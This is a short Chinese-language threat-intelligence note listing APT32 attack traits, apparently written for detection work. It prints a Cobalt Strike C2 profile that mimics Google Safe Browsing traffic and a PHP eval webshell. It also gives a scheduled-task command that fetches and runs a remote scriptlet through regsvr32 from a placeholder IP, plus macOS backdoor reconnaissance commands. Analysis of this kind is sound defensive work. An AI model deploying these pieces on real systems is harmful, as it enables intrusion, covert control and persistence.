# APT32

## 特征

1. 使用Cobalt Strike（简称CS）做RAT（远程管理工具）时，习惯使用配置文件模拟Google安全浏览服务，不过该配置文件已在Github公开.

```profile
#
# Safebrowsing Comms profile
#   https://code.google.com/p/google-safe-browsing/wiki/SafeBrowsingDesign
#
# Author: @harmj0y
#

set sleeptime "30000"; # Use a 30s interval
set jitter    "20"; # 20% jitter
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

http-get {

    # change/randomize this as you wish
    set uri "/safebrowsing/rd/CltOb12nLW1IbHehcmUtd2hUdmFzEBAY7-0KIOkUDC7h2";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";

        metadata {
            netbios;
            prepend "PREF=ID=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/vnd.google.safebrowsing-chunk";
        header "X-Content-Type-Options" "nosniff";
        header "Content-Encoding" "gzip";
        header "X-XSS-Protection" "1; mode=block";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Cache-Control" "public,max-age=172800";
        header "Age" "1222";
        header "Alternate-Protocol" "80:quic";

        output {
            print;
        }
    }
}

http-post {

    set uri "/safebrowsing/rd/CINnu27nLO8hbHdfgmUtc2ihdmFyEAcY4";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";

        id {
            netbios;
            prepend "U=779b64e1a7ed737a";
            prepend "PREF=ID=";
            header "Cookie";
        }

        output {
            print;
        }
    }

    server {
        header "Content-Type" "application/vnd.google.safebrowsing-chunk";
        header "X-Content-Type-Options" "nosniff";
        header "Content-Encoding" "gzip";
        header "X-XSS-Protection" "1; mode=block";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Cache-Control" "public,max-age=172800";
        header "Age" "1222";
        header "Alternate-Protocol" "80:quic";
        output {
            print;
        }
    }
}
```

2. 在受害者网站上上传PHP文件的webshell，意在运行的Web服务器上执行命令.

```php
if(@$_POST['变量1']&&@md5(md5($_POST['变量2']))=='<MD5 HASH>') {
$x="\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";
@eval($x($_POST['变量1']));
exit();
```

3. 在构建钓鱼邮件时构建的持久化脚本执行的命令也可以当做特征.

```bash
schtasks /create /sc MINUTE /tn ""Power Efficiency Diagnostics"" /tr ""\""regsvr32.exe\"" /s /n /u /i: \""h\""t\""t\""p://IP地址:80/download/microsoftv.jpg scrobj.dll"" /mo 15 /F
```

4. Mac OS后门会调用多个系统命令来获取信息.

```bash
ioreg -l | grep -e "Manufacturer"  //获取制造商信息
sysctl hw.model  //获取型号
system_profiler SPHardwareDataType 2>/dev/null | awk ‘/Boot ROM Version/ {split($0, line, “:”);printf(“%s”, line[2]);}
//检测系统的指定型号
system_profiler SPHardwareDataType 2>/dev/null | awk '/Processor / {split($0,line,":"); printf("%s",line[2]);}'
machdep.cpu.brand_string
//收集处理器信息
system_profiler SPHardwareDataType 2>/dev/null | awk '/Memory/ {split($0,line, ":"); printf("%s", line[2]);}'
//收集内存信息
ioreg -rd1 -c IOPlatformExpertDevice | awk '/IOPlatformSerialNumber/ { split($0, line, "\""); printf("%s", line[4]); }'
//检索设备的序列号
```
